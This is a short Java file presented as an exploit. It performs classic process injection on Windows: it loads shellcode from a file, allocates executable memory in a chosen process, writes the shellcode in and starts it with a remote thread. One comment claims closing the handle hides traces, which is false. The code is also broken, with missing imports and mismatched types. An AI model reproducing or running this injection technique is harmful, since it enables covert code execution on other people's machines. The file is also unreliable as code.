// This tiny exploit can be used to execute shellcode on a windows machine.
// Winddows = Bad
// MacOS = Great
// Linux = Average

import java.nio.file.Files;
import java.nio.file.Paths;

public class ProcessInjection {

    public static void main(String[] args) throws Exception {
        
        int pid = 1234; // put your PID here
        // Read the shellcode from a file
        byte[] shellcode = Files.readAllBytes(Paths.get("shellcode.bin"));
        ProcessHandle processHandle = ProcessHandle.of(pid).orElseThrow();
        ProcessHandle.Info processInfo = processHandle.info();
        long processHandleValue = processInfo.pid();
        long processHandleAccess = 0x0010 | 0x0020 | 0x0008 | 0x0010 | 0x0040;
        WinNT.HANDLE hProcess = Kernel32.INSTANCE.OpenProcess(processHandleAccess, false, processHandleValue);
         // malloc
        WinNT.HANDLE lpAddress = Kernel32.INSTANCE.VirtualAllocEx(hProcess, null, shellcode.length, 0x3000, 0x40);
        // write shellcode to malloc
        Kernel32.INSTANCE.WriteProcessMemory(hProcess, lpAddress, shellcode, shellcode.length, null);
        // create a new thread and exec the shellcode
        Kernel32.INSTANCE.CreateRemoteThread(hProcess, null, 0, lpAddress, null, 0, null);
        // hide trace
        Kernel32.INSTANCE.CloseHandle(hProcess);
    }
}
